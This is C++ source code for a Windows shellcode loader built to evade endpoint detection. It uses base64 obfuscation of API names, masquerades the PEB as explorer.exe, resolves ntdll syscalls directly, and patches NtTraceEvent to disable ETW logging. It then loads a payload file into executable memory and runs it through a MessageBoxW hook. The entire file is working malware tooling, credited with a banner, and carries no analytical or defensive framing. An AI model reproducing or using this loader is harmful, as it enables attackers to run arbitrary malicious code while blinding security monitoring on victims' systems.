#include "Includes.hpp"
#include "SysCall.hpp"
#include "hdlog.hpp"
inline std::wstring StringToWString(const std::string& str)
{
	int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	wchar_t* wide = new wchar_t[len + 1];
	memset(wide, '\0', sizeof(wchar_t) * (len + 1));
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wide, len);
	std::wstring w_str(wide);
	delete[] wide;
	return w_str;
}
string base64_decode(string const& encoded_string) {
	const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	string decoded_string;

	while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
		char_array_4[i++] = encoded_string[in_];
		in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++) {
				char_array_4[i] = base64_chars.find(char_array_4[i]);
			}
			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];
			for (i = 0; i < 3; i++) {
				decoded_string += char_array_3[i];
			}
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++) {
			char_array_4[j] = 0;
		}
		for (j = 0; j < 4; j++) {
			char_array_4[j] = base64_chars.find(char_array_4[j]);
		}
		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];
		for (j = 0; j < i - 1; j++) {
			decoded_string += char_array_3[j];
		}
	}

	return decoded_string;
}
/*
* Redefine winternl.h functions
*/
void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString == nullptr) {
        // If the source string is null, set the destination to zero
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = nullptr;
    }
    else {
        // Calculate the length of the source string
        size_t size = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = static_cast<USHORT>(size);
        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
    }
}

void InitializeObjectAttributes(
    POBJECT_ATTRIBUTES p,
    PUNICODE_STRING n,
    ULONG a,
    HANDLE r,
    PVOID s
) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = r;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = s;
    p->SecurityQualityOfService = nullptr; // Typically not used in basic scenarios
}

/*
* Retrieve the PEB of the current process
*/
PPEB GetPEB() {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    return peb;
}

/*
* Walk the PEB and find the base address of a module
*/
PVOID GetModuleBaseAddress(const wchar_t* moduleName) {
    PPEB peb = GetPEB();
    PLIST_ENTRY moduleList = &peb->Ldr->InLoadOrderModuleList;

    for (PLIST_ENTRY entry = moduleList->Flink; entry != moduleList; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (wcscmp(module->BaseDllName.Buffer, moduleName) == 0) {
            return module->DllBase;
        }
    }
    return nullptr; // Module not found
}

/*
* Functions to perform quicksorting
*/
int Partition(std::vector<SYSCALL_ENTRY>& arr, int low, int high) {
    auto pivot = arr[high];
    int i = (low - 1);

    for (int j = low; j < high; j++) {
        if (arr[j].Address < pivot.Address) {
            i++;
            std::swap(arr[i], arr[j]);
        }
    }
    std::swap(arr[i + 1], arr[high]);
    return (i + 1);
}

void QuickSort(std::vector<SYSCALL_ENTRY>& arr, int low, int high) {
    if (low < high) {
        int pi = Partition(arr, low, high);

        QuickSort(arr, low, pi - 1);
        QuickSort(arr, pi + 1, high);
    }
}

/*
* Parsing NTDLL's Export Address Table for syscalls
*/
std::vector<SYSCALL_ENTRY> syscallTable;
void ParseNtdllEAT() {
    HMODULE hNtdll = reinterpret_cast<HMODULE>(GetModuleBaseAddress(L"ntdll.dll"));
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hNtdll) + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<BYTE*>(hNtdll) + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pFunctions = reinterpret_cast<PDWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfFunctions);
    PDWORD pNames = reinterpret_cast<PDWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNames);
    PWORD pNameOrdinals = reinterpret_cast<PWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        PCHAR pFunctionName = reinterpret_cast<PCHAR>(reinterpret_cast<BYTE*>(hNtdll) + pNames[i]);
        if (strncmp(pFunctionName, "Zw", 2) == 0) {
            std::string modifiedName = "Nt" + std::string(pFunctionName + 2);

            SYSCALL_ENTRY entry;
            DWORD functionRVA = pFunctions[pNameOrdinals[i]];
            entry.Address = reinterpret_cast<PVOID>(reinterpret_cast<BYTE*>(hNtdll) + functionRVA);
            entry.Name = modifiedName;
            syscallTable.push_back(entry);
        }
    }

    // Quick sort syscallTable by address
    QuickSort(syscallTable, 0, syscallTable.size() - 1);

    /*
    for (int i = 0; i < syscallTable.size(); i++)
        std::cout << "Name: " << syscallTable[i].Name
        << "\nSyscall ID: " << std::hex << i
        << "\nAddress: " << syscallTable[i].Address
        << std::endl;
    */
}

/*
* Get syscall ID by function name
*/
int GetSyscall(std::string functionName) {
    for (SIZE_T i = 0; i < syscallTable.size(); ++i)
        if (syscallTable[i].Name == functionName)
            return i;
    std::cerr << "Function name not found: " << functionName << std::endl;
    return 00;
}

/*
* Get syscall address by function name
*/
PVOID GetAddress(std::string functionName) {
    for (SIZE_T i = 0; i < syscallTable.size(); ++i)
        if (syscallTable[i].Name == functionName)
            return syscallTable[i].Address;
    std::cerr << "Function name not found: " << functionName << std::endl;
    return 00;
}

uintptr_t FindSyscallOffset() noexcept {
    INT64 offset = 0;
    BYTE signature[] = { 0x0F, 0x05, 0xC3 };

    uintptr_t hNtdll = reinterpret_cast<uintptr_t>(GetModuleBaseAddress(L"ntdll.dll"));
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hNtdll) + pDosHeader->e_lfanew);
    INT64 pDllSize = (pNtHeaders->OptionalHeader.SizeOfImage);
    BYTE* currentbytes = (BYTE*)hNtdll;

    while (TRUE)
    {
        if (*(reinterpret_cast<BYTE*>(currentbytes)) == signature[0] &&
            *(reinterpret_cast<BYTE*>(currentbytes + 1)) == signature[1] &&
            *(reinterpret_cast<BYTE*>(currentbytes + 2)) == signature[2])
        {
            return hNtdll + offset;
        }
        offset++;
        if (offset + 3 > pDllSize)
            return INFINITE;
        currentbytes = reinterpret_cast<BYTE*>(hNtdll + offset);
    }
}

void Unhook(std::string funcName, BYTE code[]) {
    int NtPVM = GetSyscall(base64_decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ=="));//NtProtectVirtualMemory
    int NtWVM = GetSyscall(base64_decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk="));//NtWriteVirtualMemory
    PVOID addr = GetAddress(funcName);
    PVOID pAddr = addr;
    SIZE_T regionSize = 4096;
    SIZE_T codeSize = sizeof(code);
    ULONG protect, oldProtect;

    NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect, NtPVM);
    NtWriteVirtualMemory(NtCurrentProcess(), pAddr, code, codeSize, NULL, NtWVM);
    NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, oldProtect, &protect, NtPVM);

    return;
}

BOOL MasqueradePEB() {
	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;
	std::string ntdllstr = "bnRkbGwuZGxs";
	std::string NtQuery = "TnRRdWVyeUluZm9ybWF0aW9uUHJvY2Vzcw==";
	std::string RtlEnterCriticalSectionStr = "UnRsRW50ZXJDcml0aWNhbFNlY3Rpb24=";
	std::string RtlLeaveCriticalSectionStr = "UnRsTGVhdmVDcml0aWNhbFNlY3Rpb24=";
	std::wstring ntdlldecode = StringToWString(base64_decode(ntdllstr));
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(ntdlldecode.c_str()), base64_decode(NtQuery).c_str());
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(ntdlldecode.c_str()), base64_decode(RtlEnterCriticalSectionStr).c_str());
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(ntdlldecode.c_str()), base64_decode(RtlLeaveCriticalSectionStr).c_str());
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(ntdlldecode.c_str()), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}
/// C++ 读取bin文件
int getBinSize(string path)
{
	int size = 0;
	std::ifstream infile(path, std::ifstream::binary);
	infile.seekg(0, infile.end);
	size = infile.tellg();
	infile.seekg(0, infile.beg);
	infile.close();
	return size;
}
void readBin(std::string path, char* buf, int size)
{
	std::ifstream infile(path, std::ifstream::binary);
	infile.read(static_cast<char*>(buf), size);
	infile.close();
}
LPVOID Memory;
// 声明原始函数指针类型
typedef int (WINAPI* MessageBoxWPtr)(HWND, LPCWSTR, LPCWSTR, UINT);
// 定义全局变量保存原始函数指针
MessageBoxWPtr TrueMessageBoxW = MessageBoxW;
// 定义 hook 后的函数
int WINAPI Hook_Loader(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
{
	hdlog::info("Hook Function Success", "info");
	hdlog::info("Try to Load Success", "info");
	((void(*)())Memory)();
	return TrueMessageBoxW(hWnd, lpText, lpCaption, uType);
}

typedef LPVOID(WINAPI* pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
HMODULE hKernel32 = LoadLibrary(L"kernel32.dll");
pfnVirtualAlloc _VA_ = (pfnVirtualAlloc)GetProcAddress(hKernel32, (LPCSTR)(base64_decode("VmlydHVhbEFsbG9j").c_str()));//Get Dynamic Funcion
int main(int argc, char* argv[]) {
	int i2 = 0;
	HANDLE MutexHandle = CreateMutex(NULL, FALSE, TEXT("I1I1IIII111")); //Create Mutex to Anti Simple Dbg
	DWORD ErrorCode = 0;
	ErrorCode = GetLastError();
	if (ERROR_ALREADY_EXISTS == ErrorCode)
	{
		CloseHandle(MutexHandle);
	}
	else {
		if (NULL == MutexHandle)
		{
			return 0; //HANDLE GET FAILED
		}else{
			if (i2 == 0 && (i2 + 1) == 1 && (i2 + 2) == 2) {
				std::cout << base64_decode("ICBfX19fICAgIF8gICAgICAgICAgICAgICAgICAgICAgIF8gICAgICAgICAgX19fXyAgICAgICAgICAgIF9fX18gICAgICAgICAgICAgICAgICAgICAgCiAvIF9fX3wgIChfKSAgXyBfXyBfX18gICAgXyBfXyAgIHwgfCAgIF9fXyAgfCBfXyApICAgXyAgIF8gIHwgIF8gXCAgICBfXyBfICAgX19fICAgX19fIAogXF9fXyBcICB8IHwgfCAnXyBgIF8gXCAgfCAnXyBcICB8IHwgIC8gXyBcIHwgIF8gXCAgfCB8IHwgfCB8IHxfKSB8ICAvIF9gIHwgLyBfX3wgLyBfX3wKICBfX18pIHwgfCB8IHwgfCB8IHwgfCB8IHwgfF8pIHwgfCB8IHwgIF9fLyB8IHxfKSB8IHwgfF98IHwgfCAgX18vICB8IChffCB8IFxfXyBcIFxfXyBcCiB8X19fXy8gIHxffCB8X3wgfF98IHxffCB8IC5fXy8gIHxffCAgXF9fX3wgfF9fX18vICAgXF9fLCB8IHxffCAgICAgIFxfXyxffCB8X19fLyB8X19fLwogICAgICAgICAgICAgICAgICAgICAgICAgfF98ICAgICAgICAgICAgICAgICAgICAgICAgIHxfX18vICAgICAgICAgICAgICAgICAgICAgICAgICAgICA=") << std::endl;
				std::string filePath = argv[1];
				hdlog::info("Powered By ShaShen", "info");
				MasqueradePEB();
				hdlog::info("PEB Masquerade Success", "info");
				int size = getBinSize(filePath);
				char* data = new char[size];
				readBin(filePath, data, size);
				hdlog::info("FilePath:" + filePath, "info");
				ParseNtdllEAT();
				hdlog::info("ParseNtdllEAT Success", "info");
				uintptr_t jumpAddress = FindSyscallOffset();
				SetJumpAddress(jumpAddress);
				hdlog::info("SetJumpAddress Success", "info");
				// Patch ETW by disabling NtTraceEvent
				BYTE patch[] = { 0xc3 };
				Unhook(base64_decode("TnRUcmFjZUV2ZW50"), patch);//NtTraceEvent
				hdlog::info("UnHook: " + base64_decode("TnRUcmFjZUV2ZW50"), "info");
				Unhook(base64_decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk="), patch);//NtWriteVirtualMemory
				hdlog::info("UnHook: " + base64_decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk="), "info");
				hdlog::info("Try to Get DynamicFunction", "info");
				Memory = _VA_(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				hdlog::info("Try to RtlMoveMemory", "info");
				RtlMoveMemory(Memory, data, size);
				// Using Detours to Hook
				DetourTransactionBegin();
				DetourUpdateThread(GetCurrentThread());
				DetourAttach((PVOID*)&TrueMessageBoxW, Hook_Loader);
				DetourTransactionCommit();
				// Untils MessageBox
				MessageBoxW(NULL, L"Hello World", L"Hello World", MB_OK);
				// unhook
				DetourTransactionBegin();
				DetourUpdateThread(GetCurrentThread());
				DetourDetach((PVOID*)&TrueMessageBoxW, Hook_Loader);
				DetourTransactionCommit();
				system("pause");
				return 0;
			}
			else {
				return 0;
			}
		}
	}
	return 0;
}